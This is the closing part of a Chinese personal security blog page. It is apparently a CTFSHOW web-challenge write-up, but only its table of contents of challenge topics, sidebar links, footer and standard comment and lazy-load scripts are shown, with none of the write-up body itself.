class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-254"><span class="toc-number">1.1.</span> <span class="toc-text">web-254</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-255"><span class="toc-number">1.2.</span> <span class="toc-text">web-255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-257"><span class="toc-number">1.3.</span> <span class="toc-text">web-257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-258"><span class="toc-number">1.4.</span> <span class="toc-text">web-258</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-259"><span class="toc-number">1.5.</span> <span class="toc-text">web-259</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-260"><span class="toc-number">1.6.</span> <span class="toc-text">web-260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-261"><span class="toc-number">1.7.</span> <span class="toc-text">web-261</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-262"><span class="toc-number">1.8.</span> <span class="toc-text">web-262</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-263"><span class="toc-number">1.9.</span> <span class="toc-text">web-263</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-264"><span class="toc-number">1.10.</span> <span class="toc-text">web-264</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-265"><span class="toc-number">1.11.</span> <span class="toc-text">web-265</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-266"><span class="toc-number">1.12.</span> <span class="toc-text">web-266</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-267"><span class="toc-number">1.13.</span> <span class="toc-text">web-267</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-271"><span class="toc-number">1.14.</span> <span class="toc-text">web-271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-275"><span class="toc-number">1.15.</span> <span class="toc-text">web-275</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-276"><span class="toc-number">1.16.</span> <span class="toc-text">web-276</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-277"><span class="toc-number">1.17.</span> <span class="toc-text">web-277</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA"><span class="toc-number">2.</span> <span class="toc-text">JAVA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-301"><span class="toc-number">3.1.</span> <span class="toc-text">web-301</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-302"><span class="toc-number">3.2.</span> <span class="toc-text">web-302</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-303"><span class="toc-number">3.3.</span> <span class="toc-text">web-303</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-305"><span class="toc-number">3.4.</span> <span class="toc-text">web-305</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-306"><span class="toc-number">3.5.</span> <span class="toc-text">web-306</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-307"><span class="toc-number">3.6.</span> <span class="toc-text">web-307</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-308"><span class="toc-number">3.7.</span> <span class="toc-text">web-308</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-309"><span class="toc-number">3.8.</span> <span class="toc-text">web-309</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-310"><span class="toc-number">3.9.</span> <span class="toc-text">web-310</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpCVE"><span class="toc-number">4.</span> <span class="toc-text">phpCVE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-311"><span class="toc-number">4.1.</span> <span class="toc-text">web-311</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-312"><span class="toc-number">4.2.</span> <span class="toc-text">web-312</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-313"><span class="toc-number">4.3.</span> <span class="toc-text">web-313</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-314"><span class="toc-number">4.4.</span> <span class="toc-text">web-314</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-315"><span class="toc-number">4.5.</span> <span class="toc-text">web-315</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-316"><span class="toc-number">5.1.</span> <span class="toc-text">web-316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-320"><span class="toc-number">5.2.</span> <span class="toc-text">web-320</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NodeJS"><span class="toc-number">6.</span> <span class="toc-text">NodeJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-334"><span class="toc-number">6.1.</span> <span class="toc-text">web-334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-335"><span class="toc-number">6.2.</span> <span class="toc-text">web-335</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-336"><span class="toc-number">6.3.</span> <span class="toc-text">web-336</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-337"><span class="toc-number">6.4.</span> <span class="toc-text">web-337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-338"><span class="toc-number">6.5.</span> <span class="toc-text">web-338</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-339"><span class="toc-number">6.6.</span> <span class="toc-text">web-339</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-340"><span class="toc-number">6.7.</span> <span class="toc-text">web-340</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-341"><span class="toc-number">6.8.</span> <span class="toc-text">web-341</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-342"><span class="toc-number">6.9.</span> <span class="toc-text">web-342</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-343"><span class="toc-number">6.10.</span> <span class="toc-text">web-343</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-344"><span class="toc-number">6.11.</span> <span class="toc-text">web-344</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT"><span class="toc-number">7.</span> <span class="toc-text">JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-345"><span class="toc-number">7.1.</span> <span class="toc-text">web-345</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-346"><span class="toc-number">7.2.</span> <span class="toc-text">web-346</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-347"><span class="toc-number">7.3.</span> <span class="toc-text">web-347</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-348"><span class="toc-number">7.4.</span> <span class="toc-text">web-348</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-349"><span class="toc-number">7.5.</span> <span class="toc-text">web-349</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-350"><span class="toc-number">7.6.</span> <span class="toc-text">web-350</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">8.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-351"><span class="toc-number">8.1.</span> <span class="toc-text">web-351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-352"><span class="toc-number">8.2.</span> <span class="toc-text">web-352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-354"><span class="toc-number">8.3.</span> <span class="toc-text">web-354</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-355"><span class="toc-number">8.4.</span> <span class="toc-text">web-355</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-356"><span class="toc-number">8.5.</span> <span class="toc-text">web-356</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-357"><span class="toc-number">8.6.</span> <span class="toc-text">web-357</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-358"><span class="toc-number">8.7.</span> <span class="toc-text">web-358</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-359"><span class="toc-number">8.8.</span> <span class="toc-text">web-359</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-360"><span class="toc-number">8.9.</span> <span class="toc-text">web-360</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">9.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-361"><span class="toc-number">9.1.</span> <span class="toc-text">web-361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-362"><span class="toc-number">9.2.</span> <span class="toc-text">web-362</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-363"><span class="toc-number">9.3.</span> <span class="toc-text">web-363</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-364"><span class="toc-number">9.4.</span> <span class="toc-text">web-364</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-365"><span class="toc-number">9.5.</span> <span class="toc-text">web-365</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-366"><span class="toc-number">9.6.</span> <span class="toc-text">web-366</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-367"><span class="toc-number">9.7.</span> <span class="toc-text">web-367</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-368"><span class="toc-number">9.8.</span> <span class="toc-text">web-368</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-369"><span class="toc-number">9.9.</span> <span class="toc-text">web-369</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-370"><span class="toc-number">9.10.</span> <span class="toc-text">web-370</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-371"><span class="toc-number">9.11.</span> <span class="toc-text">web-371</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-372"><span class="toc-number">9.12.</span> <span class="toc-text">web-372</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">9.13.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">10.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-373"><span class="toc-number">10.1.</span> <span class="toc-text">web-373</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-378"><span class="toc-number">10.2.</span> <span class="toc-text">web-378</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_1"/></a><div class="content"><a class="title" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1">TryHackMe_1</a><time datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="浅析NodeJS"/></a><div class="content"><a class="title" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS">浅析NodeJS</a><time datetime="2022-11-02T11:35:18.000Z" title="发表于 2022-11-02 19:35:18">2022-11-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/10/31/CTFSHOW_WP(254-378)/'
    this.page.identifier = '/2022/10/31/CTFSHOW_WP(254-378)/'
    this.page.title = '　CTFSHOW_WP(254-378)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>